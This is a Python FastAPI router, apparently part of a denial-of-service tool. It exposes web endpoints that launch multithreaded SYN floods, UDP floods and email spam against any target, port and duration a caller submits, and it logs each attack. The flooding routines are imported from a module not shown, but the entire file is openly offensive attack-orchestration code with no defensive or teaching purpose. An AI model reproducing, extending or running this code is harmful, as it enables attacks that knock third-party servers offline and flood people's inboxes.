from base64 import encode
from fastapi import APIRouter, Request
from denialofservice.layer4 import Layer4
from globals import NUMBER_OF_THREADS
from threading import Thread
from log import log
from schemas import Layer4FloodRequest, EmailSpamRequest

layer4_router = APIRouter()


@layer4_router.post("/synflood")
async def syn_flood(syn_flood: Layer4FloodRequest, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer4.syn_flood, args=(
                syn_flood.target, syn_flood.port, syn_flood.time,))
            t.start()
        log.info(
            f"{syn_flood.target}:{syn_flood.port} SYN-Flooded from {request.client.host} for {syn_flood.time} seconds")
    except:
        log.warning(
            f"{syn_flood.target}:{syn_flood.port} SYN-Flood from {request.client.host} for {syn_flood.time} seconds could not be triggered")


@layer4_router.post("/udpflood")
async def udp_flood(udp_flood: Layer4FloodRequest, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer4.udp_flood, args=(
                udp_flood.target, udp_flood.port, udp_flood.time,))
            t.start()
        log.info(
            f"{udp_flood.target}:{udp_flood.port} UDP-Flooded from {request.client.host} for {udp_flood.time} seconds")
    except:
        log.warning(
            f"{udp_flood.target}:{udp_flood.port} UDP-Flood from {request.client.host} for {udp_flood.time} seconds could not be triggered")


@layer4_router.post("/emailspam")
async def email_spam(email_spam: EmailSpamRequest, request: Request):
    try:
        t = Thread(target=Layer4.email_spam, args=(
            email_spam.target, email_spam.time, email_spam.message,))
        t.start()
        log.info(
            f"{email_spam.target} EMAIL-Spammed from {request.client.host} for {email_spam.time} seconds")
    except Exception as e:
        print(e)
        log.warning(
            f"{email_spam.target} EMAIL-Spam from {request.client.host} for {email_spam.time} seconds could not be triggered")
